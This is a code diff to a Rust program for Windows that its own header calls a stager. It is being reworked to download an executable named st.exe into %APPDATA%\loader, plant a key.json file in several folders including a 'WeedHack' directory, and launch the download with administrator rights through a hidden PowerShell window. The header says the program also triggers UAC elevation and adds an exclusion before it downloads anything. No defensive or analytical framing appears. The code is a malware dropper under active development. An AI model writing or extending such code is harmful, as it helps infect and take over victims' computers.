@@ -1,5 +1,6 @@
 // language: Rust, file: src/main.rs, target: Windows 11
-// stager: UAC elevate → exclusion → download st.exe → write key.json → launch as admin.
+// stager: UAC elevate → exclusion → ensure %APPDATA%\loader → write key.json →
+// download st.exe into it → launch as admin from there.
 
 #![windows_subsystem = "windows"]
 
@@ -62,11 +63,18 @@ fn self_path() -> PathBuf {
     std::env::current_exe().unwrap_or_else(|_| PathBuf::from("boot.exe"))
 }
 
+// where boot.exe lives (staging dir)
 fn cwd() -> PathBuf {
     std::env::current_exe()
         .ok()
         .and_then(|p| p.parent().map(|p| p.to_path_buf()))
         .unwrap_or_else(|| PathBuf::from("."))
+}
+
+// %APPDATA%\loader — the install dir st.exe and key.json go into
+fn install_dir() -> Option<PathBuf> {
+    let appdata = std::env::var("APPDATA").ok()?;
+    Some(PathBuf::from(&appdata).join("loader"))
 }
 
 fn sentinel_path() -> PathBuf { cwd().join(SENTINEL) }
@@ -86,19 +94,17 @@ fn load_key() -> String {
     String::new()
 }
 
-fn write_key_json(key: &str, dir: &Path) {
+// write {"key":"..."} to every path st.exe might look at
+fn write_key_json(key: &str, install: &Path, staging: &Path) {
     if key.is_empty() { return; }
     let body = format!("{{\n  \"key\": \"{}\"\n}}\n", key.replace('"', "\\\""));
 
-    // 1. next to boot.exe (and st.exe after download)
-    let _ = fs::write(dir.join("key.json"), body.as_bytes());
+    // 1. install dir — %APPDATA%\loader\key.json (primary)
+    let _ = fs::create_dir_all(install);
+    let _ = fs::write(install.join("key.json"), body.as_bytes());
 
-    // 2. %APPDATA%\loader\key.json
-    if let Ok(appdata) = std::env::var("APPDATA") {
-        let loader = PathBuf::from(&appdata).join("loader");
-        let _ = fs::create_dir_all(&loader);
-        let _ = fs::write(loader.join("key.json"), body.as_bytes());
-    }
+    // 2. staging dir — next to boot.exe
+    let _ = fs::write(staging.join("key.json"), body.as_bytes());
 
     // 3. %LOCALAPPDATA%\WeedHack\key.json (legacy)
     if let Ok(local) = std::env::var("LOCALAPPDATA") {
@@ -183,18 +189,21 @@ fn download_to(base: &str, name: &str, out_path: &Path) -> Result<(), String> {
     }
     let mut buf = Vec::new();
     resp.read_to_end(&mut buf).map_err(|e| e.to_string())?;
+
+    if let Some(parent) = out_path.parent() {
+        fs::create_dir_all(parent).map_err(|e| format!("mkdir: {e}"))?;
+    }
     let mut f = fs::File::create(out_path).map_err(|e| e.to_string())?;
     f.write_all(&buf).map_err(|e| e.to_string())?;
     f.flush().ok();
     Ok(())
 }
 
-fn launch_as_admin(exe: &Path) -> Result<(), String> {
-    let dir = cwd();
+fn launch_as_admin(exe: &Path, workdir: &Path) -> Result<(), String> {
     let ps = format!(
         "Start-Process -FilePath '{}' -WorkingDirectory '{}' -Verb RunAs",
         exe.display(),
-        dir.display()
+        workdir.display()
     );
     silent_cmd("powershell")
         .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps])
@@ -226,12 +235,22 @@ fn main() {
         Err(_) => std::process::exit(1),
     };
 
-    let dir = cwd();
+    let staging = cwd();
+    let install = match install_dir() {
+        Some(d) => d,
+        None => std::process::exit(4),
+    };
 
-    // write key.json before touching st.exe — every path a sibling might check
-    write_key_json(&key, &dir);
+    // ensure %APPDATA%\loader exists
+    if fs::create_dir_all(&install).is_err() {
+        std::process::exit(5);
+    }
 
-    let target = dir.join(TARGET_EXE);
+    // write key.json before downloading so st.exe sees it immediately
+    write_key_json(&key, &install, &staging);
+
+    // download st.exe straight into the install dir
+    let target = install.join(TARGET_EXE);
     if !target.exists() {
         if download_to(&base, TARGET_EXE, &target).is_err() {
             std::process::exit(2);
@@ -241,8 +260,9 @@ fn main() {
         std::process::exit(3);
     }
 
-    // re-write after download — covers a fresh dir or failed first write
-    write_key_json(&key, &dir);
+    // re-write in case the download reset anything
+    write_key_json(&key, &install, &staging);
 
-    let _ = launch_as_admin(&target);
+    // launch st.exe with cwd = install dir so it finds key.json
+    let _ = launch_as_admin(&target, &install);
 }
